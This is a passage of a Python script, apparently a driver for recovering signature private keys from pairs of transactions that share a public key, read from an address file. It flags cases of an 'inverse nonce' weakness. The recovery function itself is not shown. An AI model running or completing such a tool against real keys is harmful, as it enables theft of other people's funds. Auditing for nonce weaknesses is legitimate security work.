    input_file = "ADDY.txt"
    print(f"Reading and parsing {input_file}...")
    
    grouped_transactions = parse_addy_file(input_file)
    total_pubkeys = len(grouped_transactions)
    
    print(f"Found {total_pubkeys} unique public key groups.\n")
    
    vulnerabilities_found = 0
    
    for pubkey, tx_list in grouped_transactions.items():
        tx_count = len(tx_list)
        print(f"Key: {pubkey[:10]}... ({tx_count} transactions found)")
        
        if tx_count < 2:
            print(" -> Insufficient transactions for this key to run pairwise analysis.\n")
            continue
            
        # Pairwise comparison inside the same public key group
        for i in range(tx_count):
            for j in range(i + 1, tx_count):
                tx1 = tx_list[i]
                tx2 = tx_list[j]
                
                print(f" -> Checking pair: TX1({tx1['txid'][:8]}) & TX2({tx2['txid'][:8]})")
                priv_key = solve_analytic_inverse_nonce(tx1, tx2)
                
                if priv_key and priv_key > 0:
                    print(f" [!] CRITICAL: Inverse Nonce Vulnerability Confirmed!")
